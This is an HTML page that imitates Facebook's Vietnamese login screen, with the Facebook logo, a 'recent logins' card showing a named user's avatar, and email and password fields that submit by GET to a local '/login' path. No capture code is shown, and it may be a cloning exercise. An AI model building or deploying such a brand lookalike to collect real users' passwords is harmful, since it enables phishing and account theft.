<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook - Đăng nhập hoặc đăng ký</title>
    <link rel="stylesheet" href="style.css" />
    <link
      rel="shortcut icon"
      href="https://facecrooks.com/wp-content/uploads/2013/10/facebook_logo_by_oguzburaksipsak-d4ubonk.png2.jpg"
      type="image/x-icon"
    />
  </head>
  <body>
    <div class="container">
      <div class="last-login">
        <div>
          <img
            style="height: 70px; margin: -20px"
            src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"
            alt="Facebook"
          />
        </div>
        <p style="font-size: 22px; line-height: 0%">Đăng nhập gần đây</p>
        <p style="color: gray">Nhấp vào ảnh của bạn hoặc thêm tài khoản</p>
        <div class="acc-info">
          <img
            class="acc-avatar"
            src="https://scontent.fhan3-3.fna.fbcdn.net/v/t1.0-1/p160x160/11046269_1623378374599178_7823804462605517565_n.jpg?_nc_cat=106&ccb=2&_nc_sid=dbb9e7&_nc_ohc=6cchoSOW6J0AX8J8I7i&_nc_ht=scontent.fhan3-3.fna&tp=6&oh=e9cd9820cea2e5032d9199f0c2e1a8b3&oe=5FBBD105"
            alt="Avatar"
          />
          <h3>Tùng</h3>
        </div>
      </div>
      <div class="login-box">
        <div class="login-form">
          <form id="login" action="/login" method="GET">
            <input
              id="email"
              autofocus="1"
              name="email"
              type="text"
              style="margin: 10px"
              placeholder="Email hoặc số điện thoại"
            />
            <input
              id="password"
              type="password"
              name="password"
              style="margin: 10px"
              placeholder="Mật khẩu"
            />
            <br />
            <button id="login-button">
              <a href="kqxs.html">Đăng nhập</a>
            </button>
            <div id="forget-password">
              <a href="#" style="color: blue">Quên mật khẩu ?</a>
            </div>
            <div id="break-line"></div>
            <button id="create">
              <a href="ttk.html">Tạo tài khoản mới</a>
            </button>
          </form>
          <div id="celeb">
            <a href="#" style="color: black"><strong>Tạo Trang</strong></a> dành
            cho người nổi tiếng, nhãn hiệu hoặc doanh nghiệp.
          </div>
        </div>
      </div>
    </div>
  </body>
</html>
